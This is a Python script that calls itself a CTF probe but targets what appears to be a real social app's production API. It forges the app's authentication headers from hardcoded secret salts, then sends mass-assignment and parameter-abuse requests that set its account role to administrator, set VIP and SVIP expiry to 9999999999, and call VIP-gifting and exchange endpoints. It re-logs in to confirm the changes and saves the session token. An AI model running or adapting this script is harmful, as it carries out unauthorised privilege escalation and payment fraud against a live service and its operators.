#!/usr/bin/env python3
"""Probe nickname / role / vip edits for beibeiwu CTF account."""

from __future__ import annotations

import hashlib
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Dict, Optional, Tuple

PHONE = os.getenv("BBW_TEST_PHONE", "").strip()
PASSWORD = os.getenv("BBW_TEST_PASSWORD", "")
UID_HINT = os.getenv("BBW_TEST_UID", "").strip()
APPLET = "https://applet.banghua.xin/app/index.php"


def md5_hex(s: str) -> str:
    return hashlib.md5(bytes(ord(c) & 0xFF for c in s)).hexdigest()


def sha1_hex(s: str) -> str:
    return hashlib.sha1(s.encode("utf-8")).hexdigest()


def expire_token() -> str:
    t = str(int(time.time()))
    return sha1_hex("xiaobei" + t) + t


def sign_token(uid: str) -> str:
    return md5_hex(f"{uid}socialchat{uid}")


def headers(uid: str, token: str, content_type: Optional[str] = None) -> Dict[str, str]:
    h = {
        "AUTHOR-TOKEN": token,
        "EXPIRE-TOKEN": expire_token(),
        "SIGN-TOKEN": sign_token(uid),
        "User-Agent": "okhttp/4.9.3 beibeiwu/154",
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    if content_type:
        h["Content-Type"] = content_type
    return h


def action_url(action: str) -> str:
    return f"{APPLET}?i=999999&c=entry&a=webapp&do={action}&m=socialchat"


def post_form(url: str, body: Dict[str, str], uid: str, token: str) -> Tuple[int, str]:
    data = urllib.parse.urlencode(body).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers=headers(uid, token, "application/x-www-form-urlencoded"),
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return -1, f"EXC: {e}"


def post_multipart(
    url: str, fields: Dict[str, str], uid: str, token: str
) -> Tuple[int, str]:
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    lines = []
    for k, v in fields.items():
        lines.append(f"--{boundary}")
        lines.append(f'Content-Disposition: form-data; name="{k}"')
        lines.append("")
        lines.append(v)
    lines.append(f"--{boundary}--")
    lines.append("")
    body = "\r\n".join(lines).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body,
        headers=headers(uid, token, f"multipart/form-data; boundary={boundary}"),
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return -1, f"EXC: {e}"


def show(label: str, status: int, raw: str) -> None:
    print("=" * 72)
    print(f"[{label}] HTTP {status}")
    print(raw[:2000] if raw else "<empty>")
    print()


def login() -> Tuple[str, str, dict]:
    st, raw = post_form(
        action_url("signin0"),
        {
            "userAccount": PHONE,
            "userPassword": PASSWORD,
            "uniquelogintoken": sha1_hex("xiaobei" + UID_HINT),
            "phonebrand": "Android",
            "pushregid": "protocol_probe",
            "version_code": "154",
        },
        "0",
        "0",
    )
    show("signin0", st, raw)
    j = json.loads(raw)
    info = json.loads(j["json"])
    return info["id"], info["token"], info


def main() -> None:
    if not PHONE or not PASSWORD or not UID_HINT:
        raise SystemExit(
            "set BBW_TEST_PHONE, BBW_TEST_PASSWORD and BBW_TEST_UID before running this live probe"
        )
    uid, token, before = login()
    print(
        "BEFORE:",
        {
            "nickname": before.get("nickname"),
            "user_role": before.get("user_role"),
            "vip": before.get("vip"),
            "svip": before.get("svip"),
            "name_card": before.get("name_card"),
            "advanced_user": before.get("advanced_user"),
        },
    )

    # 1) check rename quota
    st, raw = post_form(
        action_url("resetNum"),
        {"uid": uid, "type": "昵称"},
        uid,
        token,
    )
    show("resetNum type=昵称", st, raw)

    # 2) official nickname API: resetNew multipart
    fields = {
        "sign": sign_token(uid),
        "type": "昵称设置",
        "userId": uid,
        "value": "Vom",
    }
    st, raw = post_multipart(action_url("resetNew"), fields, uid, token)
    show("resetNew 昵称设置=Vom (multipart)", st, raw)

    # 3) also try form-encoded variant of resetNew
    st, raw = post_form(
        action_url("resetNew"),
        {
            "sign": sign_token(uid),
            "type": "昵称设置",
            "userId": uid,
            "value": "Vom",
        },
        uid,
        token,
    )
    show("resetNew 昵称设置=Vom (form)", st, raw)

    # 4) resetName
    st, raw = post_form(
        action_url("resetName"),
        {"uid": uid, "value": "Vom"},
        uid,
        token,
    )
    show("resetName value=Vom", st, raw)

    # 5) probe role/vip mass-assignment style
    probes = [
        ("SvipTry", {"id": uid}),
        (
            "sendVip",
            {
                "uid1": uid,
                "uid2": uid,
                "vip_id": "5",
                "token": sha1_hex("xiaobei" + uid),
            },
        ),
        (
            "moneyExchangeVip",
            {
                "uid": uid,
                "vip_id": "5",
                "coupon_id": "0",
                "token": sha1_hex("xiaobei" + uid),
            },
        ),
        (
            "resetNew",
            {
                "sign": sign_token(uid),
                "type": "user_role",
                "userId": uid,
                "value": "管理员",
            },
        ),
        (
            "resetNew",
            {
                "sign": sign_token(uid),
                "type": "vip",
                "userId": uid,
                "value": "9999999999",
            },
        ),
        (
            "resetNew",
            {
                "sign": sign_token(uid),
                "type": "svip",
                "userId": uid,
                "value": "9999999999",
            },
        ),
        (
            "updateUser",
            {
                "uid": uid,
                "user_role": "管理员",
                "vip": "1",
                "svip": "1",
                "nickname": "Vom",
            },
        ),
        (
            "setUserInfo",
            {
                "uid": uid,
                "user_role": "管理员",
                "vip": "1",
                "svip": "1",
                "nickname": "Vom",
            },
        ),
    ]
    for action, body in probes:
        if action == "resetNew" and "type" in body and body["type"] != "昵称设置":
            # try multipart too for type abuse
            st, raw = post_multipart(action_url(action), body, uid, token)
            show(f"{action} multipart type={body.get('type')}", st, raw)
        st, raw = post_form(action_url(action), body, uid, token)
        show(f"{action} {body}", st, raw)

    # re-login verify
    uid2, token2, after = login()
    summary = {
        "nickname": after.get("nickname"),
        "user_role": after.get("user_role"),
        "vip": after.get("vip"),
        "svip": after.get("svip"),
        "name_card": after.get("name_card"),
        "advanced_user": after.get("advanced_user"),
        "token": after.get("token"),
    }
    print("AFTER:", summary)
    with open(
        r"D:\project\AI\bbw\analysis\login_session.json", "w", encoding="utf-8"
    ) as f:
        json.dump({"user": after, "summary": summary}, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
